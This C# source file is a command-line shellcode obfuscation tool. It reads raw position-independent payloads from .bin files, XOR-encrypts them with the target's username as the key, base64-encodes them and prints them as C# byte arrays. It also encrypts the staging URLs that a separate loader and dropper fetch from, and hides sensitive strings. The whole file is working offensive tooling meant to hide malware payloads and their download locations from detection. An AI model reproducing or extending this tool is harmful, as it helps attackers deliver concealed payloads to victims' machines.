/*
To extract PIC blob (shellcodes are position independent) from .bin files and encrypt it just like url string encryption.
Compile: csc.exe /target:exe /out:encrypt.exe .\encrypt.cs
*/

using System;
using System.IO;			// StreamReader, MemoryStream
using System.Text;
using System.Collections.Generic;
//using System.Security.Cryptography;
using System.Diagnostics;


class Program
{
	// Encryption keys and Sensive string Array:
	public static string[] string_array;
	public static byte[] xor_key_byte;

	public static bool IsControlChar(int ch)
	{
		return (ch > (char)0 && ch < (char)8) // (char)0 = Null char and (char)8 = Back Space
			|| (ch > (char)13 && ch < (char)26); // (char)13 = Carriage Return and (char)26 = Substitute
	}

	public static bool IsBinary(string path)
	{
		long length = new FileInfo(path).Length;
		if (length == 0)
		{
			return false;
		}

		using (StreamReader stream = new StreamReader(path))
		{
			int ch;
			while ((ch = stream.Read()) != -1)
			{
				// link: https://stackoverflow.com/questions/910873/how-can-i-determine-if-a-file-is-binary-or-text-in-c
				if (IsControlChar(ch))
				{
					return true;
				}
			}
		}
		return false;
	}

	// =============================== Encrypting Algos ===========================

	// XOR Encryption: 
	public static void XOR_B64_Encrypt(byte[] cipher)
	{
		byte[] xored = new byte[cipher.Length];

		for(int i = 0; i < cipher.Length; i++)
		{
			xored[i] = (byte)(cipher[i] ^ xor_key_byte[i % xor_key_byte.Length]);
		}

		/*
		Console.WriteLine("\nXOR Encrypted: ");
		Console.WriteLine("-----------------\n");
		*/

		string xor_b64 = Convert.ToBase64String(xored);
		Console.WriteLine("{0}", xor_b64);
	}

	/*
	// AES Encryption:
	public static byte[] AES_Encrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
	{
		
		//SymmetricAlgorithm algorithm = Aes.Create();
		//ICryptoTransform transform = algorithm.CreateEncryptor(passwordBytes, saltBytes);
		
		//byte[] outputBuffer = transform.TransformFinalBlock(cipher, 0, cipher.Length);    // byte -> byte

		//return outputBuffer;
		
		passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

		byte[] encryptedBytes = null;

		using (MemoryStream ms = new MemoryStream())
		{
			using (RijndaelManaged AES = new RijndaelManaged())
			{
				AES.KeySize = 256;
				AES.BlockSize = 128;

				var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
				AES.Key = key.GetBytes(AES.KeySize / 8);
				AES.IV = key.GetBytes(AES.BlockSize / 8);

				AES.Mode = CipherMode.CBC;

				using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cs.Write(cipher, 0, cipher.Length);
					cs.Close();
				}
				encryptedBytes = ms.ToArray();
			}
		}

		
		//Console.WriteLine("\nAES Encrypted: ");
		//Console.WriteLine("-----------------\n");
		//PasteShellcode(encryptedBytes);
		
		return encryptedBytes;
	}

	// Encryption: AES -> b64
	// Convertion: input (unencrypted) byte -b64-> aes_b64 byte
	public static void AES_B64_Encrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
	{
		byte[] aes_byte = AES_Encrypt(cipher, saltBytes, passwordBytes);
		string aes_b64 = Convert.ToBase64String(aes_byte);

		Console.WriteLine("\n{0}", aes_b64);
	}


	// Encryption: AES -> XOR
	// Convertion: input (unencrypted) byte -aes-> aes_byte -xor-> aes_xor_byte
	public static byte[] AES_XOR_Encrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
	{
		//string b64_string = Convert.ToBase64String(cipher);

		//byte[] b64_byte = Encoding.UTF8.GetBytes(b64_string);

		byte[] aes_byte = AES_Encrypt(cipher, saltBytes, passwordBytes);

		byte[] aes_xor_byte = XOR_Encrypt(aes_byte);

		//Console.WriteLine("[+] Last One: (AES -> XOR) Encrypted: \n");

		return aes_xor_byte;
	}

	// Encryption: AES -> XOR -> B64
	// Convertion: input byte -aes-> aes_byte -xor-> aes_xor_byte -b64-> aes_xor_b64_string
	public static string AES_XOR_B64_Encrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
	{   
		byte[] aes_xor_byte = AES_XOR_Encrypt(cipher, saltBytes, passwordBytes);

		string aes_xor_b64 = Convert.ToBase64String(aes_xor_byte);
		Console.WriteLine("\nB64 Encoded: ");
		Console.WriteLine("---------------\n");
		Console.WriteLine(aes_xor_b64);

		return aes_xor_b64;
	}
	*/

	// For debugging purposes
	public static void PasteToConsole(byte[] encrypted)
	{
		/*
		Console.WriteLine("\n[+] Shellcode with \\x: ");
		Console.WriteLine("--------------------------");
		Console.Write("\\x");
		Console.WriteLine(BitConverter.ToString(encrypted).Replace("-","\\x"));
		*/

		Console.WriteLine("\n[+] Shellcode with 0x: ");
		Console.WriteLine("-------------------------\n");
		Console.Write("0x");
		Console.WriteLine(BitConverter.ToString(encrypted).Replace("-",", 0x"));
	}


	// For pasting encrypted shellcodes
	public static void PasteShellcode(byte[] encrypted)
	{
		StringBuilder newshellcode = new StringBuilder();

		newshellcode.Append("byte[] shellcode = new byte[");
		newshellcode.Append(encrypted.Length);
		newshellcode.Append("] { ");

		for (int i = 0; i < encrypted.Length; i++)
		{
			newshellcode.Append("0x");
			newshellcode.AppendFormat("{0:x2}", encrypted[i]);
			if (i < encrypted.Length - 1)
			{
				newshellcode.Append(", ");
			}

		}
		newshellcode.Append(" };");
		Console.WriteLine(newshellcode.ToString());
		Console.WriteLine("\n");
	}

	public static void Choosing_Encryption(string output, byte[] rawshellcode)
	{
		switch (output)
		{
			/*
			case "xor":
				// Convertion: byte -> byte
				xor_encrypted = XOR_Encrypt(rawshellcode);
				break;
			*/
			case "xor_b64":
				// Convertion: byte -> b64 string
				Console.WriteLine("\n===========================");
				Console.WriteLine("[+] (XOR -> b64)'ed Output: ");
				Console.WriteLine("=============================");
				XOR_B64_Encrypt(rawshellcode);
				break;
			/*
			case "aes":
				// Convertion: 3 number of byte streams (input, key, iv) -> byte
				aes_encrypted = AES_Encrypt(rawshellcode, saltBytes, passwordBytes);
				break;                              

			case "aes_xor":
				Console.WriteLine("\n====================================");
				Console.WriteLine("[+] (AES -> XOR)'ed Output: ");
				Console.WriteLine("====================================");
				// Convertion: input byte -aes-> aes_byte -xor-> aes_xor_byte
				aes_xor_encrypted = AES_XOR_Encrypt(rawshellcode, saltBytes, passwordBytes);
				break;

			case "aes_b64":
				Console.WriteLine("\n=============================");
				Console.WriteLine("[+] (AES -> b64)'ed Output: ");
				Console.WriteLine("===============================");
				// Convertion: input byte -aes-> aes_byte -xor-> aes_xor_byte -b64-> aes_xor_b64_byte
				AES_B64_Encrypt(rawshellcode, saltBytes, passwordBytes);
				break;
			*/
			default:
				// If wrong options inputed
				Console.WriteLine("\n[!] Please input encryption algorithm");
				banner();
				break;
		}
	}

	public static void banner()
	{
		Console.WriteLine("\n[+] Please feal free to make this code efficient...\n");

		Console.WriteLine("[>] All possible ways of usage: \n");
		//Console.WriteLine("1. encrypt.exe /file:file.bin /out:xor");
		//Console.WriteLine("1. encrypt.exe /file:file.bin /out:xor_b64");
		//Console.WriteLine("3. encrypt.exe /file:file.bin /out:aes");
		//Console.WriteLine("4. encrypt.exe /file:file.bin /out:aes_xor");
		Console.WriteLine("1. encrypt.exe /file:file.bin /xor_key:<usernameoftarget> /out:xor_b64");

		//Console.WriteLine("1. encrypt.exe /shellcodeurl:<url> /out:xor");
		//Console.WriteLine("1. encrypt.exe /shellcodeurl:<url> /out:xor_b64");
		//Console.WriteLine("3. encrypt.exe /shellcodeurl:<url> /out:aes");
		//Console.WriteLine("4. encrypt.exe /shellcodeurl:<url> /out:aes_xor");
		Console.WriteLine("2. encrypt.exe /shellcodeurl:<url> /xor_key:<usernameoftarget> /out:xor_b64");

		//Console.WriteLine("1. encrypt.exe /mscorliburl:<url> /out:xor");
		//Console.WriteLine("1. encrypt.exe /mscorliburl:<url> /out:xor_b64");
		//Console.WriteLine("3. encrypt.exe /mscorliburl:<url> /out:aes");
		//Console.WriteLine("4. encrypt.exe /mscorliburl:<url> /out:aes_xor");
		Console.WriteLine("3. encrypt.exe /mscorliburl:<url> /xor_key:<usernameoftarget> /out:xor_b64");

		//Console.WriteLine("1. encrypt.exe /remotewriteurl:<url> /out:xor");
		//Console.WriteLine("1. encrypt.exe /remotewriteurl:<url> /out:xor_b64");
		//Console.WriteLine("3. encrypt.exe /remotewriteurl:<url> /out:aes");
		//Console.WriteLine("4. encrypt.exe /remotewriteurl:<url> /out:aes_xor");
		Console.WriteLine("4. encrypt.exe /remotewriteurl:<url> /xor_key:<usernameoftarget> /out:xor_b64");

		//Console.WriteLine("1. encrypt.exe /remotereadurl:<url> /out:xor");
		//Console.WriteLine("1. encrypt.exe /remotereadurl:<url> /out:xor_b64");
		//Console.WriteLine("3. encrypt.exe /remotereadurl:<url> /out:aes");
		//Console.WriteLine("4. encrypt.exe /remotereadurl:<url> /out:aes_xor");
		Console.WriteLine("5. encrypt.exe /remotereadurl:<url> /xor_key:<usernameoftarget> /out:xor_b64");

		//Console.WriteLine("1. encrypt.exe /string:<string> /out:xor");
		//Console.WriteLine("1. encrypt.exe /string:<string> /out:xor_b64");
		//Console.WriteLine("3. encrypt.exe /string:<string> /out:aes");
		//Console.WriteLine("4. encrypt.exe /string:<string> /out:aes_xor");
		Console.WriteLine("6. encrypt.exe /string:<string1,string2,...,stringn> /xor_key:<usernameoftarget> /out:xor_b64\n");
	}

	public static void Main(string[] args)
	{
		//var data type: tells the compiler to figure out the type of the variable at compilation time
		var arguments = new Dictionary<string, string>();

		string last_3_chars = "";							// To store input file extension

		string from_input = "";
		byte[] xor_key = Encoding.UTF8.GetBytes(from_input);

		Console.Write("\n");
		foreach (var argument in args)
		{  	
			var id = argument.IndexOf(':');
			//Console.WriteLine($"id: {id}");	// 5
			if (id > 0)
			{
				// key
				string prefix = argument.Substring(0, id);
				// value
				string postfix = argument.Substring(id+1);

				// assigning value to key
				// key <= value
				arguments[prefix] = postfix;

				Console.WriteLine($"[+] Value = {arguments[prefix]}");

				// Storing input file extension
				if(arguments.ContainsKey("/file"))
				{
					last_3_chars = arguments["/file"].Substring(arguments["/file"].Length-3);

					if(arguments.ContainsKey("/xor_key"))
					{
						string xorKey = arguments["/xor_key"];
						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
					}
				}
				else if(arguments.ContainsKey("/shellcodeurl"))
				{
					last_3_chars = arguments["/shellcodeurl"].Substring(arguments["/shellcodeurl"].Length-3);

					if(arguments.ContainsKey("/xor_key"))
					{
						string xorKey = arguments["/xor_key"];
						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
					}
				}
				else if(arguments.ContainsKey("/mscorliburl"))
				{
					last_3_chars = arguments["/mscorliburl"].Substring(arguments["/mscorliburl"].Length-3);

					if(arguments.ContainsKey("/xor_key"))
					{
						string xorKey = arguments["/xor_key"];
						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
					}
				}
				else if(arguments.ContainsKey("/remotewriteurl"))
				{
					last_3_chars = arguments["/remotewriteurl"].Substring(arguments["/remotewriteurl"].Length-3);

					if(arguments.ContainsKey("/xor_key"))
					{
						string xorKey = arguments["/xor_key"];
						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
					}
				}
				else if(arguments.ContainsKey("/remotereadurl"))
				{
					last_3_chars = arguments["/remotereadurl"].Substring(arguments["/remotereadurl"].Length-3);

					if(arguments.ContainsKey("/xor_key"))
					{
						string xorKey = arguments["/xor_key"];
						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
					}
				}
				else if(arguments.ContainsKey("/string"))
				{
					string_array = arguments["/string"].Split(',');

					if(arguments.ContainsKey("/xor_key"))
					{
						string xorKey = arguments["/xor_key"];
						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
					}
				}
			}
			else
			{
				arguments[argument] = string.Empty;
			}
			//Console.WriteLine("HERE: 71");
		}

		//Console.WriteLine("HERE: 73");

		if (arguments.Count == 0 || !arguments.ContainsKey("/out"))
		{
			Console.WriteLine("\n[!] Please enter /out as argument");

			if (!arguments.ContainsKey("/file") || !arguments.ContainsKey("/shellcodeurl") || !arguments.ContainsKey("/mscorliburl") || !arguments.ContainsKey("/remotewriteurl") || !arguments.ContainsKey("/string") || !arguments.ContainsKey("/remotereadurl"))
			{
				Console.WriteLine("[!] Please enter /file: or, /shellcodeurl: or, /mscorliburl or, /remotewriteurl or, /remotereadurl or, /string as arguments");
				banner();
			}

		}
		else if (string.IsNullOrEmpty(arguments["/out"]))
		{
			Console.WriteLine("\n[!] Empty /out ");

			if ((string.IsNullOrEmpty(arguments["/file"]) || (string.IsNullOrEmpty(arguments["/shellcodeurl"])) || (string.IsNullOrEmpty(arguments["/mscorliburl"])) || (string.IsNullOrEmpty(arguments["/remotewriteurl"])) || (string.IsNullOrEmpty(arguments["/string"])) || (string.IsNullOrEmpty(arguments["/remotereadurl"]))))
			{
				Console.WriteLine("\n[!] Empty input file or url or string parameters ");
				banner();
			}
		}
		// Sensitive String Encryption
		else if(arguments.ContainsKey("/string"))
		{
			if(arguments.ContainsKey("/xor_key"))
			{
				Console.Write("\n");
				foreach(string i in string_array)
				{
					Console.Write("Xor-Base64({0}): ", i);

					XOR_B64_Encrypt(Encoding.UTF8.GetBytes(i));
				}
			}
		}
		// Checking last 3 characters of corresponding Value of a Key
		else if (last_3_chars != "txt" && last_3_chars != "bin" && last_3_chars != "exe")
		{
			Console.WriteLine("\n[!] Invalid file type. Only .txt, .bin or .exe are accepted: {0}", last_3_chars);
			banner();
		}
		// 1st url call: By Loader
		else if(arguments.ContainsKey("/mscorliburl"))
		{
			if(arguments.ContainsKey("/xor_key"))
			{
				Console.Write("\n");
				string urlPath = arguments["/mscorliburl"];

				byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);

				Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes);
			}
		}
		// 2nd url call: By Loader
		else if(arguments.ContainsKey("/remotewriteurl"))
		{
			if(arguments.ContainsKey("/xor_key"))
			{
				Console.Write("\n");
				string urlPath = arguments["/remotewriteurl"];

				byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);

				Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes);
			}
		}
		// 3rd url call: By Loader
		else if(arguments.ContainsKey("/remotereadurl"))
		{
			if(arguments.ContainsKey("/xor_key"))
			{
				Console.Write("\n");
				string urlPath = arguments["/remotereadurl"];

				byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);

				Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes);
			}				
		}
		// Last url call: By Dropper
		else if(arguments.ContainsKey("/shellcodeurl"))
		{
			if(arguments.ContainsKey("/xor_key"))
			{
				Console.Write("\n");
				string urlPath = arguments["/shellcodeurl"];

				byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);

				Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes);
			}
		}
		// If it is shellcode
		else if(arguments.ContainsKey("/file"))
		{
			if(arguments.ContainsKey("/xor_key"))
			{
				Console.Write("\n");
				
				var filePath = arguments["/file"];

				Console.WriteLine("[+] filePath: {0}", filePath);

				if (!File.Exists(filePath)) //if file exists
				{   
					Console.WriteLine("\n[+] Missing input file or probably inputed 'urlPath' instead of 'filePath' ");
					Environment.Exit(0);
				}
				else
				{
					try
					{
						if(IsBinary(filePath))
						{
							Console.WriteLine("[+] Input file has '.{0}' extension	=>	Raw payload detected!", last_3_chars);
							byte[] rawshellcode = File.ReadAllBytes(filePath);

							Console.WriteLine("\n==================");
							Console.WriteLine("Rawshellcode: ");
							Console.WriteLine("==================");
							PasteToConsole(rawshellcode);

							Choosing_Encryption(arguments["/out"].ToLower(), rawshellcode);
						}
						else
						{
							Console.WriteLine("[!] Couldn't detect file input content.");
							Environment.Exit(0);
						}
					}
					catch
					{
						Console.WriteLine("[!] Error encrypting");
					}
				}
			}
		}
		else
		{
			Console.WriteLine("[!] Doesn't contain URL path");
		}
	}
}
